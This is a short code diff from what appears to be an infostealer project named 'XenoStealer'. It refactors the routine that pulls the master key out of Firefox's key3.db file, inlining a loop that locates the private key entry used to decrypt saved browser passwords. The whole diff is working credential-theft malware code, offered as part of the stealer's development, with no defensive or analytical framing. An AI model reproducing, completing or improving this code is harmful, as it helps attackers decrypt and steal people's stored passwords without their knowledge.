@@ -260,18 +260,6 @@ namespace XenoStealer
             return false;
         }
 
-        private static byte[] GetPrivateHoldingData(KeyValuePair<string, byte[]>[] keyValuePairs)
-        {
-            foreach (KeyValuePair<string, byte[]> i in keyValuePairs)
-            {
-                if (i.Key.ToLower() != "password-check" && i.Key.ToLower() != "global-salt" && i.Key.ToLower() != "version")
-                {
-                    return i.Value;
-                }
-            }
-            return null;
-        }
-
         private static byte[] GetMasterKeyFromKey3(string path)
         {
             byte[] fileBytes = Utils.ForceReadFile(path);
@@ -315,8 +303,16 @@ namespace XenoStealer
             {
                 return null;// the password check failed.
             }
-
-            byte[] asnData = GetPrivateHoldingData(parsedData);
+            
+            byte[] asnData = null;
+            foreach (KeyValuePair<string, byte[]> i in parsedData)
+            {
+                if (i.Key.ToLower() != "password-check" && i.Key.ToLower() != "global-salt" && i.Key.ToLower() != "version")//the private key data is stored in the 4th key, which has a weird name, so we get it like this.
+                {
+                    asnData=i.Value;
+                    break;
+                }
+            }
 
             if (asnData == null)
             {
